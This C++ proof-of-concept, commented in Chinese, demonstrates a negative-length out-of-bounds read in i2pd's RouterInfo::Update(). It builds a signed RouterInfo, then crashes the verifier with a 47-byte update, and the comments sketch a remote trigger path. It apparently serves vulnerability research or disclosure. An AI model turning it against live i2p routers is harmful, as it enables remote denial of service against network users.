// PoC-C1: i2pd RouterInfo::Update() negative length → ECDSA 流式哈希 OOB 读 SEGV
// 注: Ed25519 路径 (EVP_DigestVerify 一次性) 拒绝巨长输入不崩; ECDSA-P256/P384/P521 崩溃
// 漏洞: RouterInfo.cpp:95  int l = len - m_RouterIdentity->GetSignatureLen();
//       无负数检查。len < sigLen 时 l<0 → Verify(buf, (size_t)l=巨值, buf+l=负偏移)
//       → 验签器对越界内存做 SHA/Ed25519 → 远程可触发崩溃
// 攻击路径: DatabaseStore(RI) 两次——第一次正常入库, 第二次同 ident 短 RI → NetDb::AddRouterInfo → Update
#include "RouterInfo.h"
#include "Identity.h"
#include "Crypto.h"
#include "Log.h"
#include "util.h"
#include "Timestamp.h"
#include "I2PEndian.h"
#include "Log.h"

#include <cstdio>
#include <cstring>
#include <memory>
#include <iostream>

int main (int argc, char * argv[])
{
        i2p::log::Logger().SendTo (std::make_shared<std::ostream> (std::cout.rdbuf()));
        i2p::log::Logger().SetLogLevel ("error");
        i2p::crypto::InitCrypto (false);

        // 1. 生成攻击者 Ed25519 身份
        auto keys = i2p::data::PrivateKeys::CreateRandomKeys (
                i2p::data::SIGNING_KEY_TYPE_ECDSA_SHA256_P256, i2p::data::CRYPTO_KEY_TYPE_ELGAMAL, false);
        auto ident = keys.GetPublic ();
        size_t identLen = ident->GetFullLen ();
        printf ("[*] attacker identity: %zu bytes, siglen %zu\n", identLen, ident->GetSignatureLen ());

        // 2. 构造合法 RI: [identity][ts8][numAddr1=0][numPeers1=0][optsize2=0][sig64]
        uint8_t riBuf[i2p::data::MAX_RI_BUFFER_SIZE];
        memset (riBuf, 0, sizeof (riBuf));
        ident->ToBuffer (riBuf, i2p::data::MAX_RI_BUFFER_SIZE);
        size_t off = identLen;
        htobe64buf (riBuf + off, i2p::util::GetMillisecondsSinceEpoch ()); off += 8; // published ts (ms!)
        riBuf[off++] = 0;                                     // numAddresses
        riBuf[off++] = 0;                                     // numPeers
        htobe16buf (riBuf + off, 0); off += 2;                // options size = 0
        // 签名 identity+body
        keys.Sign (riBuf, off, riBuf + off);
        off += ident->GetSignatureLen ();
        size_t riLen = off;
        printf ("[*] valid RI built: %zu bytes, sig-range=%zu\n", riLen, riLen - 64);
        printf ("[*] manual sig verify: %s\n",
                ident->Verify (riBuf, riLen - 64, riBuf + riLen - 64) ? "PASS" : "FAIL");

        // 3. 正常解析入库 (模拟第一次 DatabaseStore)
        auto ri = std::make_shared<i2p::data::RouterInfo> (riBuf, riLen);
        printf ("[*] initial parse done: unreachable=%d (不影响 Update), ts=%llu\n",
                (int)ri->IsUnreachable (), (unsigned long long)ri->GetTimestamp ());

        // 4. 恶意更新缓冲: 47 字节垃圾 (len < sigLen=64 即触发负长度;
        //    Update 使用的是已存 RI 的 identity/sigLen, 与缓冲内容无关)
        uint8_t evil[47];
        memset (evil, 0, sizeof (evil));

        printf ("[*] calling Update(evil, 47) — len(47) < siglen(64) → l = -17\n");
        printf ("[*] Verify(buf, (size_t)-17, buf-17) about to read OOB memory...\n");
        fflush (stdout);

        // 5. 触发
        ri->Update (evil, sizeof (evil));

        printf ("[!] Update returned without crash (unexpected)\n");
        return 0;
}
